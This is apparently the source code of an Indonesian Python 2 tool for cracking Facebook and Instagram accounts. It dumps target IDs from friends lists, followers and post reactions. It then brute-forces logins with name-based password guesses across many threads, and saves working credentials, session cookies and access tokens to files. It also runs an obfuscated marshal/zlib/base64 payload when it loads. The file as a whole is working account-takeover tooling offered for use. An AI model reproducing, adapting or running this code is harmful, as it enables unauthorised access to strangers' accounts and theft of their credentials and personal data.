                ok.append('%s ∆ %s ∆ %s' % (user,pw,response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s--> %s ∆ %s ∆ %s %s %s  ' % (orange,user,pw,day,month,year)
                    cp.append("%s ∆ %s ∆ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s--> %s ∆ %s  ∆ %s        ' % (orange,user,pw)
                cp.append('%s ∆ %s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s[%s%s%s]%s %s/%s [OK-:%s]-[CP-:%s]'%(U,K,datetime.now().strftime('%H:%M:%S'),U,P,len(self.id),loop,len(ok),len(cp))),
        sys.stdout.flush()
        #	print('                %s[%s %s %s]'%(U,K,datetime.now().strftime('%H:%M:%S'),U))
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s--> %s ∆ %s ∆ %s  ' % (H,user,pw,kuki)
                ok.append("%s ∆ %s ∆ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s--> %s ∆ %s ∆ %s %s %s ' % (orange,user,pw,day,month,year)
                    cp.append("%s ∆ %s ∆ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s--> %s ∆ %s            ' % (orange,user,pw)
                cp.append("%s ∆ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s[%s%s%s]%s %s/%s [OK-:%s]-[CP-:%s]'%(U,K,datetime.now().strftime('%H:%M:%S'),U,P,len(self.id),loop,len(ok),len(cp))),
        sys.stdout.flush()
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fdevelopers.facebook.com%2F&lwv=100&refid=8', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s--> %s ∆ %s ∆ %s ' % (H,user,pw,kuki)
                ok.append("%s ∆ %s ∆ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s--> %s ∆ %s ∆ %s %s %s ' % (orange,user,pw,day,month,year)
                    cp.append("%s ∆ %s ∆ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s--> %s ∆ %s              ' % (orange,user,pw)
                cp.append("%s ∆ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s[%s%s%s]%s %s/%s [OK-:%s]-[CP-:%s]'%(U,K,datetime.now().strftime('%H:%M:%S'),U,P,len(self.id),loop,len(ok),len(cp))),
        sys.stdout.flush()
        
        
def crack2(user, pwx):
	global looping, loping
	c_bff_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
				print "\r \033[1;92m--> %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/?force_classic_login=&"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				# print ("\r",data)
				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					cepeh = "Checkpoint"
					ingfo(user, pw, cepeh)
					with open("cepeh.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+" ◊ "+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					okeh = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, okeh)
						with open("okeh.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
				elif "Please wait" in str(data):
					print ("\r%s[!] Mode pesawatkan 2 detik  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s[!] Tidak ada koneksi Internet "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None
# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] Ganti user agent "%(P,P,P))
	print (" [%s02%s] Cek user agent "%(P,P))
	print (" [%s00%s] Kembali "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,H))
    if u == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s∆%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,P,P,H,P,P,P))
    	print (" [%s∆%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(P,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,H))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
        
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
        id = a['id']
    except KeyError:
        print("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    banner()
    kotak()
#    banner()
    print (' %s[∆] Auhtor    : Changcuters'%(P))
    print (' [∆] gh auhtor : https://github.com/Changcuters')
    print (' [∆] gh auhtor : https://github.com/Haeckerfb')
    print (jembut)
    print (' [∆] Name Tumbal Anda : %s'%(nama))
    print (' [∆] ID  Tumbal Anda  : %s'%(id))
    print (' [∆] Device IP Anda   : %s'%(IP))
    print (jembut)
    print (' [%s01%s] %sStart crack or mulai%s'%(P,P,H,P)) 
    print (' [%s02%s] Dump id public or friend'%(P,P)) 
    print (' [%s03%s] Dump id followers public'%(P,P)) 
    print (' [%s04%s] Dump id reaction post'%(P,P))
    print (' [%s05%s] Crack cari nama (instagram) '%(P,P))
    print (' [%s06%s] Setting user agent penggunan'%(P,P)) 
    print (' [%s07%s] Cek hasil crack or penghasilan'%(P,P)) 
    print (' ')
    print (' [%srm%s] Apus Hasil Dump'%(P,P)) 
#    print (' [%s0%s] Cek Opsi Akun'%(P,P))
#    print (' [%s09%s] Info script'%(P,P))
  #  print (' [%s10%s] Crack Instagram [%sNew%s]'%(P,P,H,P))
    print (' [%s00%s] Hapus token (Log out program)'%(M,P))
    _romi_x_mbokey_ = raw_input('\n%s [?] Menu : %s'%(P,H))
    if _romi_x_mbokey_ == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    elif _romi_x_mbokey_ in['2','02']:
    	massel = raw_input('\n%s [%s+%s] Apakah Anda Ingin Men Dump ID Massal [y/t] ?: ' % (P,H,P))
        if massel in ['', ]:
            print '\n%s [%s+%s] isi yang benar' % (P,H,P)
            jeda(2)
            menu()
        elif massel in ['y', 'Y']:
            massal(romz)
        elif massel in ['t', 'T']:
            publik(romz)
        else:
            print '\n%s [%s+%s] isi yang benar' % (P,H,P)
            jeda(2)
            menu()
    elif _romi_x_mbokey_ in['3','03']:
        followers(romz)
    elif _romi_x_mbokey_ in['4','04']:
        postingan(romz)
    elif _romi_x_mbokey_ in['5','05']:
    	igg()
    elif _romi_x_mbokey_ in['1','01']:
        ngentod().romiy()
    elif _romi_x_mbokey_ in['6','06']:
    	useragent()
    elif _romi_x_mbokey_ in['10','010']:
    	log_igeh()
    	menu_igeh()
    elif _romi_x_mbokey_ in['7','07']:
    	print "\n%s [01] Hasil crack akun facebook "%(P)
        print "%s [02] Hasil crack akun instagram "%(P)
        c = raw_input('\n%s [?] Menu : %s'%(P,H))
    	hasill(c)
    elif _romi_x_mbokey_ in['8','08']:
        jeeck_cp()
    elif _romi_x_mbokey_ in['rm','Rm','RM']:
    	rmrf()
    elif _romi_x_mbokey_ in['9','09']:
        print(ingfo)
    elif _romi_x_mbokey_ in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s [√] berhasil terhapus '%(H));exit()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
         
def rmrf():
	os.system('rm -rf dump.txt')
	os.system('rm -rf dump/')
	jalan('\n %s[%s✓%s] Berhasil Menghapus Hasil Dump....'%(P,U,P))
	raw_input('\n%s [ %senter %s] '%(P,H,P))
	menu()
def hasill(c):
	if c in[""]:
		print ("%s[%s!%s] isi yang benar kentod"%(P,M,P));exit()
	elif c in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				nm_file = ("%s"%(file)).replace("-", " ")
				total = open("hasil/%s"%(file)).read().splitlines()
				print("%s -> %s%s + total akun = %s%s"%(K,P,file,K,len(total)));jeda(0.2)
			print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
			file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
			if file == "":
				print("%s [!] file tidak ada "%(M))
			#
			print(" %s[%s∆%s] --------------------------------------"%(P,K,P));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
				print(tling);jeda(0.03)
			print(" %s[%s∆%s] --------------------------------------"%(P,K,P));jeda(2)
			raw_input('\n%s [ %senter %s] '%(P,H,P));menu()
		except (IOError):
			print("\n%s [!] tidak ada hasil "%(M))
			raw_input('\n%s [ %senter %s] '%(P,H,P));menu()
	elif c in["2","02"]:
		print "\n%s [01] Hasil crack akun %sOK "%(P,H)
        print "%s [02] Hasil crack akun %sCP "%(P,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(P,H))
		if rom in['1','01']:
			try:
				oke = open("okeh.txt", "r").readlines()
				print(" %s[%s∆%s] --------------------------------------"%(P,P,P));jeda(2)
				jalan(" [%s∆%s] total akun : %s%s"%(P,P,H,str(len(oke))))
				print(" %s[%s∆%s] --------------------------------------%s"%(P,P,P,H));jeda(2)
				okek = open("okeh.txt", "r").read()
				print (okek)
				exit(" %s[%s∆%s] --------------------------------------"%(P,P,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] tidak ada hasil awokawokawok")
		elif rom in['2','02']:
			try:
				cepe = open("cepeh.txt", "r").readlines()
				print(" %s[%s∆%s] --------------------------------------"%(P,P,P));jeda(2)
				jalan(" [%s∆%s] total akun : %s%s"%(P,P,P,str(len(cepe))))
				print(" %s[%s∆%s] --------------------------------------%s"%(P,P,P,P));jeda(2)
				cepek = open("cepeh.txt", "r").read()
				print (cepek)
				exit(" %s[%s∆%s] --------------------------------------"%(P,P,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] tidak ada hasil awokawokawok")
		else:
			exit()
def igg():
	print ("\n%s [%s!%s] Contoh nama %s: %sMbokey "%(P,M,P,M,H))
	usr_ = raw_input('%s [?] input nama > %s'%(P,H))
	jumlah = raw_input('%s [?] Limit user > %s'%(P,H))
	bff_2 = usr_.replace(" ", "")
	cr.append("romi_afrizal")
	mi.append(bff_2+"|"+bff_2)
	mi.append(bff_2+"_"+"|"+bff_2)
	for _i_ in range(1, jumlah+1):
		mi.append(bff_2+str(_i_)+"|"+bff_2)
		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
	print '\n%s [%s∆%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.2)
	print '%s [%s∆%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_bff_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							_bff_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
					else:
						_bff_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							_bff_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_bff_.append(_m_)
				else:
					_bff_.append(_i_[0]+"123")
					_bff_.append(_i_[0]+"12345")
					_bff_.append(_o_)
				log.submit(crack2, _o_, _bff_)
			except: pass
	exit("%s• finished"%(H))
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
      
yan, status_foll, poll, cr, looping = [], [], [], [], 1
url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
urll = "https://www.instagram.com/"
url = "https://www.instagram.com/accounts/login/?force_classic_login=&"
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}
header = {}
param = {}
def proses():
    print('\n\n %s[%s+%s] hasil OK disimpan ke -> results/IG-OK-%s-%s-%s.txt'%(N,O,N,ha, op, ta));time.sleep(0.2)
    print(' [%s+%s] hasil CP disimpan ke -> results/IG-CP-%s-%s-%s.txt'%(O,N,ha, op, ta));time.sleep(0.2)
    print('\n [%s!%s] tekan ctrl+z di keyboard anda untuk menjeda proses crack\n'%(M,N));time.sleep(0.2)
def log_igeh():
    global cookie
    try:
        kontol = open("ig.txt", "r").read()
    except IOError:
        masuk_ig()
    else:
        url = "https://i.instagram.com/api/v1/friendships/39431798677/followers/?count=5"
        with requests.Session() as ses:
            try:
                otw = ses.get(url, cookies={"cookie": kontol}, headers=headerz_api)
                if "users" in json.loads(otw.content):
                    cookie = {"cookie": kontol}
                else:
                    print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
            except ValueError:
                print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
def masuk_ig():
    global cookie
    jalan("\n %s[%s+%s] Login menggunakan akun tumbal Instagram anda [%s+%s]"%(N,H,N,H,N))
    print(" [+]----------------------------------------------[+]");time.sleep(0.03)
    userr = raw_input(' [%s?%s] username :%s '%(H,N,K))
    peweh = raw_input('%s [%s?%s] password :%s '%(N,H,N,K))
    try:
        try:
            headerz = {"User-Agent": user_agentz}
            with requests.Session() as ses:
                scr = "https://www.instagram.com/"
                data = ses.get(scr, headers=headerz).content
                toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
            headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": toket,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
            param = {"username": userr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), peweh),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
            }
        except:
            header = {}
            param = {}
            pass
        with requests.Session() as ses:
            url = "https://www.instagram.com/accounts/login/?force_classic_login=&"
            respon = ses.post(url, data=param, headers=headerss)
            data = json.loads(respon.content)
            _2 = respon.cookies.get_dict()
            if "userId" in str(data):
                for xxx in _2:
                    with open("ig.txt", "a") as simpan:
                        simpan.write(xxx+"="+_2[xxx]+";")
                masuk = open("ig.txt","r").read()
                cookie = {"ig.txt": masuk}
                jalan("\n %s[%s*%s] selamat cookies kamu valid"%(N,O,N));time.sleep(2)
                exit(" [%s!%s] jalankan ulang perintah nya dengan ketik python run.py"%(M,N))
            elif "checkpoint_url" in str(data):
                print('\n %s[%s!%s] opshh seperti akun anda terkena checkpoint:('%(N,M,N));masuk_ig()
            elif "Please wait" in str(data):
                print('\n %s[%s!%s] hidupkan mode pesawat 5 detik'%(N,M,N));masuk_ig()
            else:
                exit('\n %s[%s!%s] username/password salah'%(N,M,N));masuk_ig()
    except KeyboardInterrupt:
        print('\n [!] Masukan username atau password yang benar');masuk_ig()
def menu_igeh():
    print('\n [%s1%s]. Crack Followers Publik'%(O,N));time.sleep(0.03)
    print(' [%s2%s]. Crack Pencarian Nama'%(O,N));time.sleep(0.03)
    print(' [%s3%s]. Cek Hasil Crack'%(O,N));time.sleep(0.03)
    print(' [%s0%s]. Kembali ke menu awal'%(M,N));time.sleep(0.03)
    pepek = raw_input('\n [%s+%s] raw_input : '%(H,N))
    if pepek in['']:
        print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
    elif pepek in['1','01']:
        pw = ""
        status = ""
        username = raw_input('\n [%s•%s] Username target : '%(O,N))
        ingfo(username, pw, status)
        print('\n%s [%s1%s] Pengikut : %s%s'%(N,O,N,H,str(pengikut)))
        print('%s [%s2%s] Mengikuti: %s%s'%(N,O,N,H,str(mengikuti)))
        kuntul = raw_input('\n %s[%s+%s] raw_input : '%(N,H,N))
        limit = raw_input(' %s[%s+%s] limit : '%(N,H,N))
        if kuntul in['']:
            print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
        elif kuntul in['1','01']:
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        elif kuntul in['2','02']:
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        else:
            print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,kuntul,N));time.sleep(2);menu_igeh()
    elif pepek in['2','02']:
        jalan('\n %s[%s+%s] Masukan nama yang mau anda cari. contoh : %sMark%s'%(N,O,N,H,N))
        user = raw_input('\n [%s•%s] Masukan nama : '%(O,N))
        jumlah = int(raw_input(' %s[%s+%s] limit : '%(N,H,N)))
        ask = user.replace(" ", "")
        cr.append("asw_lu")
        yan.append(ask+"|"+ask)
        yan.append(ask+"_"+"|"+ask)
        for x in range(1, jumlah+1):
            yan.append(ask+str(x)+"|"+ask)
            yan.append(ask+"_"+str(x)+"|"+ask)
            yan.append(ask+str(x)+"_"+"|"+ask)
        proses()
        peweh()
    elif pepek in['3','03']:
        dirs = os.listdir("results")
        print('\n [ hasil crack yang tersimpan di file anda ]\n')
        for file in dirs:
            print(" [%s+%s] %s"%(O,N,file))
        file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
        if file == "":
            file = raw_input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
